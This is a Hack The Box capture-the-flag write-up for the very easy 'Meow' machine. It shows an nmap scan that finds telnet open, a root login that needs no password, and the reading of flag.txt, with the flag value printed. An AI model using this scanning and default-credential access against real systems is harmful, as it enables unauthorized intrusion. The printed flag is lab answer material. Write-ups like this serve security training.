# Machine Name: Meow
**Platform:** Hack The Box
**Difficulty:** Very Easy
**OS:** Linux

## Introduction

* Brief description of the machine and its overall theme.
* Mention your initial thoughts and approach to the challenge.

## Recon

* **Nmap Scan:** `nmap meow.htb -T4 -Pn -sVC -oN ~/Desktop/nmap/meow.txt`

```bash
$ nmap meow.htb -T4 -Pn -sVC -oN ~/Desktop/nmap/meow.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-23 15:47 JST
Nmap scan report for meow.htb (10.129.1.17)
Host is up (0.18s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.55 seconds
```

- The nmap shows only one open port (23) , which is a `telnet`. 
## Vulnerability Identification

* **Vulnerability 1:** non-encryption
    * telnet is well known for not encrypting the communication. Attacker can easily commit middleman attack
* **Vulnerability 2 :** allowing root access
    * The telnet machine for this task has default root access. You can use *root* for logging in. 

```bash
$ telnet meow.htb
Trying 10.129.1.17...
Connected to meow.htb.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 23 Sep 2024 07:53:58 AM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             137
  Users logged in:       0
  IPv4 address for eth0: 10.129.1.17
  IPv6 address for eth0: dead:beef::250:56ff:feb0:1cb0

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
```
## Exploitation

* **Gaining Initial Access:**
    * `telnet {target_ip}` to gain access to telnet
    * `ls` to find `flag.txt`
	    * `get` was not the right command apparently, so I used `cat` instead to reveal the .txt

```bash
root@Meow:~# ls
flag.txt  snap
root@Meow:~# get flag.txt

Command 'get' not found, but there are 18 similar ones.

root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
root@Meow:~# 

```
## Lessons Learned

* telnet is vulnerable due to clear text communication
## Conclusion

* There was an open port 23 : telnet that allowed root access
* [ ] `flag.txt` was in the directory to easily gain flag

**Happy hacking!**